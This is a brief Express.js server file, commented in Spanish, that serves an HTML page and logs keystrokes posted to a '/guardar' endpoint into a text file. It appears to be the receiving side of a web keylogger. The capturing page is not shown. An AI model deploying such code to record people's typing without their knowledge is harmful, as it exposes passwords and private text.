const express = require('express');
const fs = require('fs');
const path = require('path'); // Necesario para manejar rutas
const app = express();
const PORT = 3000;

// Middleware para procesar JSON
app.use(express.json());

// Ruta para servir el archivo HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html')); // Cambia 'index.html' si el archivo tiene otro nombre
});

// Ruta para recibir las teclas
app.post('/guardar', (req, res) => {
    const { tecla, timestamp } = req.body;

    // Guardar en un archivo de texto
    const log = `Tecla: ${tecla}, Timestamp: ${timestamp}\n`;
    fs.appendFile('pulsaciones.txt', log, (err) => {
        if (err) {
            console.error('Error al guardar la pulsación:', err);
            return res.status(500).send('Error al guardar');
        }
        console.log('Pulsación guardada:', log);
        res.status(200).send('Pulsación recibida');
    });
});

// Iniciar el servidor
app.listen(PORT, () => {
    console.log(`Servidor corriendo en http://127.0.0.1:${PORT}`);
});
